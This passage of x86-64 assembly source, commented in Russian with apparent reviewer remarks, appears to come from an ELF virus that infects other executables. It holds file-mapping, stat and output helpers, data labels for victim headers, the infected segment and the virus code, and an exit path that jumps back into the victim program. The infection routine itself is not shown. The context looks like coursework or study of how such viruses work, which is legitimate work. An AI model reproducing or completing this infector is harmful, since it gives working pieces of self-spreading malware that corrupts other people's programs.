    mov     $0x10, %r8      # calc пройденных итераций
    mov     %rcx, %r9
    sub     %r9, %r8

    // ROTATE NUM RIGHT
rotate_num_right:
    cmp     $0, %r8
    jle     continue_cnvrt_addr_loop

    shr     $0x4, %rdx
    dec     %r8
    jmp     rotate_num_right

continue_cnvrt_addr_loop:
    movb    %dl, (%rsi) # записать число по адресу
    mov     %rdi, %rdx  # восстановить исходное число
    shl     $0x4, %rbx  # маску на 4 бита влево
    dec     %rsi        # укатель на следующий байт

    loop   cnvrt_addr_loop

    pop     %rsi
    pop     %rbx
    pop     %rdx
    pop     %rcx
    pop     %r9
    pop     %r8

    ret


/// NB!: Писать на ассемблере тесты к ассемблеру (да еще и в одном и том же файле) - удовольствие явно уровнем ниже чем писать тесты на лиспе. Я бы на твоем месте писал тесты к функциям как скрипты к GDB - это куда проще. Найди, как GDB умеет проверять значения в при попадании в бряк, делать IF и выдавать логи - и тебе останется только открыть файл лога чтобы посмотреть все ли тесты прошли.

/// TEST_CNVRT_ADDR_IN_16_BYTE
/// тестирует конвертацию числа
/// если не подключать конвертациж полученного числа и не выводить его на экран,
/// то посмотреть результат можно только в гдб
/// TODO решить эту проблему */
//test_cnvrt_addr_in_16_byte:
//     mov     $0xFFFFFFFF, %rdi
//     call    cnvrt_addr_in_16_byte
//     ret
//     цель теста:
//     - сконвертировать восьмибайтовое число в 16-байтовый массив
//     - сконвертировать каждый байт этого массива в ascii-код
//     - вывести полученное число в stdout */
// test_cnvrt_addr_in_16_byte:
//     pushq   %rbp
// 	movq    %rsp, %rbp

//     // mov     $0x40, %rdi        # тесты с разными числами
//     // mov     $0xFFFFFFFFFFFFFFFF, %rdi
//     // mov     $0x8FFFE, %rdi
//     mov     $0xDEADBEEFBAADF00D, %rdi
//     // mov     $-31, %rdi   # (?)

//     call    cnvrt_addr_in_16_byte

//     mov     $byted_addr, %rsi
//     call    cnvrt_num_to_hex_string

//     mov     $converted_addr, %rsi
//     mov     $0x11, %rdx

//     call    _my_write

//     popq    %rbp
// 	ret

/// MY_MMAP file into memory
/// Считывает файл в память по заданному адресу.
/// Флаги должны быть такими же, какие передавали
/// open для открытия файла.
/// @PARAMS
///  - %RDI - адрес для записи (по умолчанию NULL,
///           в этом случае назначается OS)
///  - %RSI - длина считываемого файла
///  - %RDX - права доступа к памяти
///           (RDONLY, RDWR и т.д.)
///  - %RCX -  права для доступа к памяти для
///            процессов (MMAP_SHARED, MMAP_PRIVATE)
///  * %R8 -   fd считываемого файла
///  * %R9 -   offset от начала считываемого файла
_my_mmap:
    push %rbx
	push %rcx
	push %rdx
	push %rbp
	push %r10

	mov %r9, %r15
	mov %rsi, %r13
	mov %rdi, %r12
	mov %ecx, %r14d

	movslq %r8d, %rbp
	movslq %edx, %rbx
	movslq %r14d, %r10
	mov $0x9, %eax

	syscall

	pop %r10
	pop %rbp
	pop %rdx
	pop %rcx
	pop %rbx

	ret

/// NB!:google it : repnz movsb
/// будет работать быстрее и без медленного сискола в ОС
// /* MY_MEMCPY
//   Побайтово записывает данный в размере bytesz из памяти src в память dest

//  * @PARAMS
//  *   - %RDI - ptr dest
//  *   - %RSI - ptr src
//  *   - %RDX - bytesz
//  */

// my_memcpy:

//     pushq    %rcx
//     pushq    %rax

//     // loop cnt
//     movq     %rdx, %rcx

// cycle_my_memcpy:

//     movq	%rsi, %rax
//     movzbl	(%rax), %edx

// 	movq	%rdi, %rax
// 	movb	%dl, (%rax)

//     inc      %rdi
//     inc      %rsi

//     loop     cycle_my_memcpy

// my_memcpy_exit:
//     popq     %rax
//     popq     %rcx

//     ret

// // MY_MEMCPY TEST
// _memcpy_test_msg:
//    .ascii "Test memcpy msg\n"
//    .set len_memcpy_test_msg, . - _memcpy_test_msg

// memcpy_test_buf:
//     .space 40, 0

//     // цель теста: скопировать строку в буфер и вывести ее в stdout
// test_my_memcpy:
//     lea     memcpy_test_buf(%rip), %rdi
//     lea     _memcpy_test_msg(%rip), %rsi
//     mov     $len_memcpy_test_msg, %rdx

//     call    my_memcpy

//     mov     $0x1, %rdi
//     lea     memcpy_test_buf(%rip), %rsi
//     mov     $len_memcpy_test_msg, %rdx

//     call    _my_write
// 	ret


// MY_STAT
// @PARAMS
// %RDI - file name
// %RSI - stat struct pointer
_my_stat:
    // stat изменяет этот регистр
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~
    // NB: Any syscall destroys %rcx and %r11
    // Почему это происходит?
    // Инструкция входа в режим ядра syscall
    // сохраняет в регистре RCX значение RIP,
    // а в R11 – значение регистра флагов и
    // переходит к выполнению функции ядра
    // (адрес которой хранится в специальном
    // Model Specific -регистре).
    // Инструкция sysret же выполняет всё наоборот:
    // восстанавливает RIP из регистра RCX и регистр
    // флагов (почти весь) из регистра R11.
    // Поскольку в x64 кол-во регистров довольно
    // много, а RCX и R11 не участвуют в передаче
    // параметров, создатели системы решили не
    // заморачиваться с сохранением этих регистров
    // (возможно, заодно и для ускорения системного
    // вызова и возврата)
    push    %rcx

    mov     $0x04, %rax
    syscall
    test    %rax, %rax
    jnz     _my_stat_error
_my_stat_exit:
    pop    %rcx
  	ret
    ERR_MSG _my_stat "my_stat"


/// OPENFILE
/// Открывает файл с указанными флагами,
/// маппит его в память
///
/// @PARAMS:
/// - %RDI - file name
/// - %RSI - flags
///
/// @RET:
/// - %RAX - указатель на файл в памяти
_openfile:
    push    %rbp
    mov     %rsp, %rbp

    mov     $0x2, %rax  # fopen syscall
    syscall
    test    %rax, %rax
    jl      _openfile_neg_fd_error

    // save all regs
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %r9
    push    %r10

    // space for local vars
    sub     $0xA0, %rsp

    mov     %rax, %rcx          # fd
    mov     %rsi, %rdx          # openfile flags

    // call stat
    // (need no less 0xA0 for struct stat)
    leaq    -0xA0(%rbp), %rsi   #  stat struct ptr
    call    _my_stat

    // prepare params for mmap
    mov     %rcx, %r8           # fd
    mov     %rdx, %rax          # flags
    xor     %rdi, %rdi          # addr

    // 0x70 - offset to filesz field in stat struct
    mov     -0x70(%rbp), %rsi   # filesz
    xor     %r9, %r9            # offset

    // doesn't need shared mmap
    mov     $MAP_PRIVATE, %rcx

    mov     $O_RDONLY, %rbx
    cmp     %rbx, %rax
    je      mmap_rdonly

    // define mmap flags
    mov     $O_RDWR, %rbx
    cmp     %rbx, %rax
    jne     _openfile_flags_error

mmap_rdwr:
    mov     $(PROT_READ | PROT_WRITE), %rdx # prot
    jmp     call_my_mmap

mmap_rdonly:
    mov     $PROT_READ, %rdx            # prot
    // call mmap
call_my_mmap:
    call    _my_mmap
    test    %rax, %rax
    jle     _openfile_ptr_error

    // recover stack
    add     $0xA0, %rsp
    pop     %r10
    pop     %r9
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx

_openfile_exit:
    pop     %rbp
	ret

    ERR_MSG _openfile_neg_fd "openfile neg fd"
    ERR_MSG _openfile_flags "openfile undefined flags"
    ERR_MSG _openfile_ptr "openfile returned zero ptr"


// /* MY_FREAD

//     Читает bytesz n раз из спаменной памяти в указанную область памяти

//  * @PARAMS
//     * %RDI - dest
//     * %RSI - src
//     * %RDX - iter cntr
//     * %RCX - bytesz
//     */

// _my_fread:

//     push    %rcx
//     push    %rax
//     push    %rbx

//     mov     %rcx, %rbx
//     movq    %rdx, %rcx   # loop cnt

// cycle_fread:
//     mov    %rbx, %rdx
//     call    my_memcpy
//     loop    cycle_fread

// _fread_exit:
//     pop     %rbx
//     pop     %rax
//     pop     %rcx
// 	ret


// // TEST MY_FREAD

// /*
//     цель теста:
//     смаппить содержимое file_name в память, прочитать  данные из памяти в массив,
//     вывести прочитанное в stdout

//     у теста есть один недостаток: размер открытого файла не высчитывается,
//     а устанавливается вручную. На данный момент это 37 байт.
// */

// test_fread_filenm:
//     .string  "test_my_fread.txt"

// test_fread_buf:
//     .space 37, 0

// test_my_fread:

//     mov     $test_fread_filenm, %rdi
//     // mov     $dnt_exist_filenm, %rdi   # тест ошибки открытия файла

//     // MMAP FILE
//     mov     $O_RDWR, %rsi
//     call    openfile

//     cmp     $0, %rax
//     jle     test_fread_exit

//     mov     %rax, %rbx

//     // SET PARAMS FOR MY_FREAD
//     lea     test_fread_buf(%rip), %rdi  # dest
//     mov     %rbx, %rsi                  # src
//     mov     $0x1, %rdx                  # iter cnt
//     mov     $0x25, %rcx                  # filesz

//     call    _my_fread

//     // PRINT RESULT
//     mov     $0x1, %rdi
//     lea     test_fread_buf(%rip), %rsi
//     mov     $0x25, %rdx                  # filesz
//     call    _my_write

// test_fread_exit:
// 	ret


// Close
// @PARAMS
//   - %RDI - fd
//
// close:
//     mov     $0x2, %rax
//     syscall
// 	ret

/// NB!: Наверху уже было написано почему мы данные
/// кладем _под_ стек. И что я вижу тут?

fd:
   .quad 0

victim_elf_addr:
	.quad 0

victim_phdr_table_addr:
	.quad 0

victim_phdr_table_size:
	.quad 0

victim_phdr_amount:
	.quad 0

victim_shdr_table_addr:
	.quad 0

victim_shdr_table_size:
	.quad 0

victim_shdr_amount:
    .quad 0

infected_seg_phdr_addr:
	.quad 0

infected_seg_end_vaddr:
	.quad 0

infected_seg_size:
	.quad 0

infected_sect_shdr_addr:
	.quad 0

victim_code_before_infect_point_size:
	.quad 0

victim_code_after_infect_point_addr:
	.quad 0

victim_code_after_infect_point_size:
	.quad 0

virus_code_addr:
	.quad 0

virus_code_size:
	.quad 0

symtab_shdr_addr:
	.quad 0

symtab_records_amount:
	.quad 0

_canary:
    .quad CANARY_VAL

_stack_top:
    .space 6000, 0
_stack_bottom:
    .quad 0


    // -------------------------------------------

// dnt_exist_filenm:
//     .string  "test2.txt"

// file_name2:
//     .string  "asm-test2.txt"

_file_name3:
    .string  "example"

_victim_nolibs_filenm:
    .string  "victim"

virus_file_name:
    .string  "asm"

small_virus_file_name:
    .string  "virus"

new_elf_file:
    .string "test_inf"

// msg:
//     .string "write test string \n"

// msg2:
//     .string "fwrite test string \n"

// # сообщения, которые будут использоваться при распечатке полей эльф-хедера
// e_type_msg:
//     .string "ElfHdr e_type: "
// e_machine_msg:
//     .string "ElfHdr e_machine: "
// e_version_msg:
//     .string "ElfHdr e_version: "
// e_entry_msg:
//     .string "ElfHdr e_entry: "
// e_phoff_msg:
//     .string "ElfHdr e_phoff: "
// e_shoff_msg:
//     .string "ElfHdr e_shoff: "
// e_ehsize_msg:
//     .string "ElfHdr e_ehsize: "
// e_flags_msg:
//     .string "ElfHdr e_flags: "
// e_phentsize_msg:
//     .string "ElfHdr e_phentsize: "
// e_phnum_msg:
//     .string "ElfHdr e_phnum: "
// e_shentsize_msg:
//     .string "ElfHdr e_shentsize: "
// e_shnum_msg:
//     .string "ElfHdr e_shnum: "
// e_shstrndx_msg:
//     .string "ElfHdr e_shstrndx: "

//  # сообщения, которые будут использоваться при распечатке полей заголовка программ
// p_type_msg:
//     .string "PhHdr p_type: "
// p_flags_msg:
//     .string "PhHdr p_flags: "
// p_offset_msg:
//     .string "PhHdr p_offset: "
// p_vaddr_msg:
//     .string "PhHdr p_vaddr: "
// p_paddr_msg:
//     .string "PhHdr p_paddr: "
// p_filesz_msg:
//     .string "PhHdr p_filesz: "
// p_memsz_msg:
//     .string "PhHdr p_memsz: "
// p_align_msg:
//     .string "PhHdr p_align: "

// # сообщения, которые будут использоваться при распечатке полей заголовка секций
// sh_name_msg:
//     .string "ShHdr sh_name: "
// sh_type_msg:
//     .string "ShHdr sh_type: "
// sh_flags_msg:
//     .string "ShHdr sh_flags: "
// sh_addr_msg:
//     .string "ShHdr sh_addr: "
// sh_offset_msg:
//     .string "ShHdr sh_offset: "
// sh_size_msg:
//     .string "ShHdr sh_size: "
// sh_link_msg:
//     .string "ShHdr sh_link: "
// sh_info_msg:
//     .string "ShHdr sh_info: "
// sh_addralign_msg:
//     .string "ShHdr sh_addralign: "
// sh_entsize_msg:
//     .string "ShHdr sh_entsize: "

// next_str:
//     .string "\n"

newline:
    .ascii "\n"
byted_addr:
    .space  16, 0

// WRITE TO STDOUT
// @PARAMS
//   - %RSI - msg pointer
//   - %RDX - msg size
_my_write:
    mov     $0x1, %rax          # write
    mov     %rax, %rdi          # to stdout
    syscall
    ret

// ERROR HANDLING
// @PARAMS
//   - %RSI - msg pointer
//   - %RDX - msg size
_error_msg:
    .ifdef DEBUG_MODE
    call    _my_write
    .endif
    jmp _end_infector

_end_infector:
    mov     old_rsp(%rip), %rsp     # restore old %RSP
    jmp     _start_victim
_fin_infector:
     nop
